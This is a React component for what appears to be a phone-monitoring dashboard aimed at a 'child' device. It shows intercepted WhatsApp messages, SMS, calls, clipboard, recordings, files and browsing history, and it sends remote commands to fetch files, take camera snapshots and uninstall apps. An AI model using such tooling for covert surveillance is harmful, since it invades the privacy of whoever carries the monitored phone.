"use client";

import { useApp } from "@/context/AppContext";

import { UniversalActivityFeed } from "./activity/UniversalActivityFeed";
import { ActivityFeedItem } from "@/types/dashboard";

import React, { useState } from "react";
import {
  MessageSquare,
  Phone,
  Bell,
  Globe,
  Music,
  Smartphone,
  Radio,
  FileText,
  Image as ImageIcon,
  Folder,
  ShieldAlert,
} from "lucide-react";
import {
  WhatsAppTab,
  CallsTab,
  SmsTab,
  NotificationsTab,
  WebHistoryTab,
  ClipboardTab,
} from "./activity/ActivityCommsTabs";
import { RecordingsTab } from "./activity/ActivityRecordingsTab";
import { AppsTab, SimInfoTab, AlertsTab } from "./activity/ActivityAppsSimAlertsTabs";
import { GalleryTab } from "./activity/ActivityGalleryTab";
import { FilesTab } from "./activity/ActivityFilesTab";
import { PhotoViewerModal, FileDetailsModal } from "./activity/ActivityModals";

export type ActivityTabType =
  | "feed"
  | "whatsapp"
  | "calls"
  | "sms"
  | "notifications"
  | "web"
  | "apps"
  | "recordings"
  | "sim"
  | "clipboard"
  | "gallery"
  | "files"
  | "alerts";

export default function ActivityLogList() {
  const {
    activityTab,
    setActivityTab,
    childData,
    commands,
    selectedDirectoryPath,
    setSelectedDirectoryPath,
  } = useApp();

  const {
    whatsappLogs = [],
    callLogs = [],
    smsLogs = [],
    notifications = [],
    webHistory = [],
    recordings = [],
    packageEvents = [],
    simInfo = null,
    clipboardLogs = [],
    mediaGallery = [],
    fileExplorer = [],
    installedApps = [],
    blockedPackages = {},
    securityAlerts = [],
    snapshotsList = [],
    activityFeed = [],
  } = childData;

  const {
    sendCommand,
    handleToggleBlockApp: onToggleBlockApp,
    handleUninstallApp: onUninstallApp,
    handleRequestSnapshot,
    capturingFacing = null,
  } = commands;
  const [selectedPhotoViewer, setSelectedPhotoViewer] = useState<any | null>(null);
  const [selectedFile, setSelectedFile] = useState<any | null>(null);
  const [copiedPath, setCopiedPath] = useState<string | null>(null);
  const [requestedFiles, setRequestedFiles] = useState<Record<string, boolean>>({});

  const handleCopyPath = (path: string) => {
    if (!path) return;
    navigator.clipboard.writeText(path);
    setCopiedPath(path);
    setTimeout(() => setCopiedPath(null), 2500);
  };

  const handleRequestFile = (path: string) => {
    if (!path) return;
    sendCommand("FETCH_MEDIA", path);
    setRequestedFiles((prev) => ({ ...prev, [path]: true }));
    alert("Phone ko file request bhej di gayi hai! Jaise hi upload hogi yahan dikh jayegi.");
  };

  const tabs = [
    { id: "feed" as ActivityTabType, label: "Live Feed", icon: Radio, count: activityFeed.length },
    { id: "whatsapp" as ActivityTabType, label: "WhatsApp", icon: MessageSquare, count: whatsappLogs.length },
    { id: "calls" as ActivityTabType, label: "Calls", icon: Phone, count: callLogs.length },
    { id: "sms" as ActivityTabType, label: "SMS", icon: MessageSquare, count: smsLogs.length },
    { id: "notifications" as ActivityTabType, label: "Notifs", icon: Bell, count: notifications.length },
    { id: "clipboard" as ActivityTabType, label: "Clipboard", icon: FileText, count: clipboardLogs.length },
    { id: "gallery" as ActivityTabType, label: "Gallery", icon: ImageIcon, count: snapshotsList.length + mediaGallery.length },
    { id: "files" as ActivityTabType, label: "Files", icon: Folder, count: fileExplorer.length },
    { id: "web" as ActivityTabType, label: "Web", icon: Globe, count: webHistory.length },
    { id: "recordings" as ActivityTabType, label: "Recordings", icon: Music, count: recordings.length },
    { id: "apps" as ActivityTabType, label: "Apps", icon: Smartphone, count: installedApps.length > 0 ? installedApps.length : packageEvents.length },
    { id: "sim" as ActivityTabType, label: "SIM Info", icon: Radio, count: simInfo ? 1 : 0 },
    { id: "alerts" as ActivityTabType, label: "Alerts", icon: ShieldAlert, count: securityAlerts.length },
  ];

  return (
    <div className="flex flex-col gap-3">
      {/* Activity Sub-Navigation */}
      <div className="flex items-center gap-2 overflow-x-auto pb-1">
        {tabs.map((tab) => {
          const IconComp = tab.icon;
          const isActive = activityTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActivityTab(tab.id)}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-semibold whitespace-nowrap transition ${
                isActive
                  ? "bg-purple-600 text-white shadow-lg shadow-purple-600/30"
                  : "bg-[#1E1E26] text-gray-400 hover:text-white hover:bg-[#252530]"
              }`}
            >
              <IconComp className="w-3.5 h-3.5" />
              <span>{tab.label}</span>
              {tab.count > 0 && (
                <span
                  className={`text-[10px] px-1.5 py-0.5 rounded-full ${
                    isActive ? "bg-white/20 text-white" : "bg-black/30 text-gray-400"
                  }`}
                >
                  {tab.count}
                </span>
              )}
            </button>
          );
        })}
      </div>

      {/* Tab Panels */}
      {activityTab === "feed" && <UniversalActivityFeed events={activityFeed} />}
      {activityTab === "whatsapp" && <WhatsAppTab logs={whatsappLogs} />}
      {activityTab === "calls" && <CallsTab logs={callLogs} />}
      {activityTab === "sms" && <SmsTab logs={smsLogs} />}
      {activityTab === "notifications" && <NotificationsTab logs={notifications} />}
      {activityTab === "web" && <WebHistoryTab logs={webHistory} />}
      {activityTab === "clipboard" && <ClipboardTab logs={clipboardLogs} />}
      {activityTab === "recordings" && <RecordingsTab recordings={recordings} />}
      {activityTab === "apps" && (
        <AppsTab
          installedApps={installedApps}
          packageEvents={packageEvents}
          blockedPackages={blockedPackages}
          sendCommand={sendCommand}
          onToggleBlockApp={onToggleBlockApp}
          onUninstallApp={onUninstallApp}
        />
      )}
      {activityTab === "sim" && <SimInfoTab simInfo={simInfo} />}
      {activityTab === "alerts" && <AlertsTab alerts={securityAlerts} />}
      {activityTab === "gallery" && (
        <GalleryTab
          snapshotsList={snapshotsList}
          mediaGallery={mediaGallery}
          capturingFacing={capturingFacing}
          handleRequestSnapshot={handleRequestSnapshot}
          sendCommand={sendCommand}
          onSelectPhoto={setSelectedPhotoViewer}
          onRequestFile={handleRequestFile}
          requestedFiles={requestedFiles}
        />
      )}
      {activityTab === "files" && (
        <FilesTab
          fileExplorer={fileExplorer}
          mediaGallery={mediaGallery}
          selectedDirectoryPath={selectedDirectoryPath}
          setSelectedDirectoryPath={setSelectedDirectoryPath}
          sendCommand={sendCommand}
          onSelectFile={setSelectedFile}
          onSelectPhoto={setSelectedPhotoViewer}
          onCopyPath={handleCopyPath}
          copiedPath={copiedPath}
          onRequestFile={handleRequestFile}
          requestedFiles={requestedFiles}
        />
      )}

      {/* Modals */}
      <PhotoViewerModal
        selectedPhotoViewer={selectedPhotoViewer}
        setSelectedPhotoViewer={setSelectedPhotoViewer}
        onCopyPath={handleCopyPath}
        copiedPath={copiedPath}
        onRequestFile={handleRequestFile}
        requestedFiles={requestedFiles}
      />
      <FileDetailsModal
        selectedFile={selectedFile}
        setSelectedFile={setSelectedFile}
        onCopyPath={handleCopyPath}
        copiedPath={copiedPath}
        onRequestFile={handleRequestFile}
        requestedFiles={requestedFiles}
      />
    </div>
  );
}
